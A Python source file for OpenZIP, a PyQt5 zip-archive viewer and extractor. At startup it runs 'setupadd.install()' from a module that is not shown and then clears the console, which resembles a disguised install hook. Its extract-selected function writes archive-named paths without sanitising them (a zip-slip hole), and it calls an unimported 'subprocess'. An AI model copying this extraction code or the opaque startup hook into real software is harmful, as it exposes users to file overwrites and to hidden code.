from PyQt5 import QtWidgets, uic, QtGui
from PyQt5.QtWidgets import QFileDialog, QMessageBox
from PyQt5.QtCore import QDir
import sys
import zipfile
import shutil
import os
import setupadd

setupadd.install()
os.system("cls")

class OpenZIP(QtWidgets.QMainWindow):
    def __init__(self):
        super(OpenZIP, self).__init__()
        uic.loadUi("main.ui", self)
        self.actionew.triggered.connect(self.open_archive)
        self.extract.clicked.connect(self.extract_files)
        self.extractSelected.clicked.connect(self.extract_selected_file)
        self.actionAbout_OpenZIP.triggered.connect(self.show_about_dialog)
        self.archive = None
        self.setWindowIcon(QtGui.QIcon('icon.ico'))

    def open_archive(self):
        file_dialog = QFileDialog()
        filepath, _ = file_dialog.getOpenFileName(self, 'Open Zip Archive', '', 'Zip files (*.zip)')
        if filepath:
            self.archive_path = filepath
            self.load_files_from_archive(filepath)

    def load_files_from_archive(self, filepath):
        self.archive = zipfile.ZipFile(filepath, 'r')
        model = QtGui.QStandardItemModel(self.fileViewer)
        file_infos = self.archive.infolist()
        for file_info in file_infos:
            filename = file_info.filename
            item = QtGui.QStandardItem(filename)
            icon = self.get_file_icon(filename)
            item.setIcon(icon)
            model.appendRow(item)
        self.fileViewer.setModel(model)

    def get_file_icon(self, filename):
        icon_provider = QtWidgets.QFileIconProvider()
        icon = icon_provider.icon(QtWidgets.QFileIconProvider.File)
        return icon

    def extract_files(self):
        if self.archive:
            folder_dialog = QFileDialog()
            folderpath = folder_dialog.getExistingDirectory(self, 'Select Directory to Extract Files', QDir.currentPath())
            if folderpath:
                self.archive.extractall(folderpath)
                self.show_done_dialog(folderpath)

    def extract_selected_file(self):
        if self.archive:
            selected_indexes = self.fileViewer.selectedIndexes()
            if selected_indexes:
                selected_file = selected_indexes[0].data()
                folder_dialog = QFileDialog()
                folderpath = folder_dialog.getExistingDirectory(self, 'Select Directory to Extract File', QDir.currentPath())
                if folderpath:
                    with self.archive.open(selected_file) as file:
                        with open(folderpath + '/' + selected_file, 'wb') as output_file:
                            shutil.copyfileobj(file, output_file)
                    self.show_done_dialog(folderpath)

    def show_about_dialog(self):
        about_dialog = QtWidgets.QDialog(self)
        uic.loadUi("about.ui", about_dialog)
        about_dialog.exec_()

    def show_done_dialog(self, folderpath):
        done_dialog = QtWidgets.QDialog(self)
        uic.loadUi("done.ui", done_dialog)
        done_dialog.okbtn.clicked.connect(done_dialog.accept)
        done_dialog.expbtn.clicked.connect(lambda: self.open_folder_in_explorer(folderpath))
        done_dialog.exec_()

    def open_folder_in_explorer(self, folderpath):
        if sys.platform == "win32":
            os.startfile(folderpath)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", folderpath])
        else:
            subprocess.Popen(["xdg-open", folderpath])

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = OpenZIP()
    window.show()
    sys.exit(app.exec_())
